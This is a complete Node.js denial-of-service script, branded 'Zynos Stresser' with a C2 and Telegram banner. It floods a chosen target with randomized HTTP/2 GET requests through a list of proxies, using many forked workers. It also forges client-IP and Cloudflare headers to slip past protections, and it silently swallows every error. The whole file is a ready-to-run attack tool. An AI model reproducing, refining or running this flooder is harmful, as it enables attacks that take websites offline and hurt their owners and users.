const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

const ip_spoof = () => {
    const getRandomByte = () => Math.floor(Math.random() * 255);
    return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
};

const language_header = ["id-ID,id;q=0.9,en;q=0.8","en-US,en;q=0.9,id;q=0.8","en-GB,en;q=0.9","ja-JP,ja;q=0.9,en;q=0.8","zh-CN,zh;q=0.9,en;q=0.8"];
const cplist = ["TLS_AES_128_CCM_8_SHA256","TLS_AES_128_CCM_SHA256","TLS_CHACHA20_POLY1305_SHA256","TLS_AES_256_GCM_SHA384","TLS_AES_128_GCM_SHA256"];
const rateHeaders = [{"accept-encoding":"gzip, deflate, br"},{"accept-encoding":"gzip, deflate"},{"accept-encoding":"br, gzip"}];

const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.SSL_OP_NO_TLSv1_3 | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_COOKIE_EXCHANGE | crypto.constants.SSL_OP_PKCS1_CHECK_1 | crypto.constants.SSL_OP_PKCS1_CHECK_2 | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

if (process.argv.length < 7) {
    console.log(`Usage: host time req thread proxy.txt`);
    process.exit();
}

const args = {target: process.argv[2],time: ~~process.argv[3],Rate: ~~process.argv[4],threads: ~~process.argv[5],proxyFile: process.argv[6]};
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    console.clear();
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
    console.log(`\x1b[33mUser: \x1b[32mPrv\x1b[0m \x1b[36m|\x1b[0m \x1b[33mVip: \x1b[32mtrue\x1b[0m \x1b[36m|\x1b[0m \x1b[33mSuperVip: \x1b[32mtrue\x1b[0m`);
    console.log(`\x1b[33mAdmin: \x1b[35mZYNOS\x1b[0m \x1b[36m|\x1b[0m \x1b[33mExpired: \x1b[31mNo\x1b[0m \x1b[36m|\x1b[0m \x1b[33mTime Limit: \x1b[32m${args.time}s\x1b[0m`);
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
    console.log(`\x1b[33mTarget: \x1b[37m${args.target}\x1b[0m`);
    console.log(`\x1b[33mRate: \x1b[37m${args.Rate}/s\x1b[0m \x1b[36m|\x1b[0m \x1b[33mThreads: \x1b[37m${args.threads}\x1b[0m`);
    console.log(`\x1b[33mProxy: \x1b[37m${args.proxyFile} (\x1b[32m${proxies.length}\x1b[37m)\x1b[0m`);
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
    console.log(`\x1b[35mZynos Stresser 2025-2026 | C2 | t.me/zynos_official\x1b[0m`);
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 1);
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({host: options.host,port: options.port});

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (response.includes("HTTP/1.1 200")) {
                return callback(connection, undefined);
            } else {
                connection.destroy();
                return callback(undefined, "error: invalid response");
            }
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout");
        });

        connection.on("error", () => {
            connection.destroy();
            return callback(undefined, "error: connection error");
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim() && !line.startsWith('#'));
}

function randomElement(elements) {
    return elements[Math.floor(Math.random() * elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    let ZynosHeaders = {
        ":method": "GET",
        ":authority": parsedTarget.host,
        ":scheme": "https",
        ":path": (parsedTarget.path || "/") + "?" + randstr(6) + "=" + generateRandomString(20, 30) + "&" + randstr(4) + "=" + generateRandomString(15, 25),
        "upgrade-insecure-requests": "1",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": language_header[Math.floor(Math.random() * language_header.length)],
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "X-Forwarded-For": ip_spoof(),
        "X-Real-IP": ip_spoof(),
        "X-Client-IP": ip_spoof(),
        "CF-Connecting-IP": ip_spoof(),
        "CF-Visitor": '{"scheme":"https"}',
        "CF-Worker": "true",
        "CDN-Loop": "cloudflare",
        "priority": "u=0, i",
        "te": "trailers"
    };

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host,
        timeout: 10
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error || !connection) return;

        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true);

        const tlsOptions = {
            socket: connection,
            ALPNProtocols: ["h2"],
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            ciphers: cplist[Math.floor(Math.random() * cplist.length)],
            secureProtocol: "TLS_method",
            honorCipherOrder: true,
            secureOptions: secureOptions
        };

        const tlsSocket = tls.connect(443, parsedTarget.host, tlsOptions, () => {
            if (tlsSocket.alpnProtocol !== 'h2') {
                tlsSocket.destroy();
                connection.destroy();
                return;
            }

            tlsSocket.setKeepAlive(true, 600000);
            tlsSocket.setNoDelay(true);

            const client = http2.connect(parsedTarget.href, {
                createConnection: () => tlsSocket,
                settings: {
                    headerTableSize: 65536,
                    maxHeaderListSize: 32768,
                    initialWindowSize: 15564991,
                    maxFrameSize: 16384,
                    enablePush: false
                }
            });

            client.on("connect", () => {
                const interval = setInterval(() => {
                    for (let i = 0; i < args.Rate; i++) {
                        const dynHeaders = {...ZynosHeaders, ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]};
                        try {
                            const req = client.request(dynHeaders, {parent: 0,exclusive: true,weight: 220});
                            req.on('response', () => { req.close(); req.destroy(); });
                            req.on('error', () => { req.destroy(); });
                            req.end();
                        } catch (err) {}
                    }
                }, 1000);
                client.on('close', () => clearInterval(interval));
            });

            client.on("error", () => {
                client.destroy();
                tlsSocket.destroy();
                connection.destroy();
            });

            client.on("close", () => {
                tlsSocket.destroy();
                connection.destroy();
            });
        });

        tlsSocket.on("error", () => {
            tlsSocket.destroy();
            connection.destroy();
        });
    });
}

const StopScript = () => process.exit(1);
setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});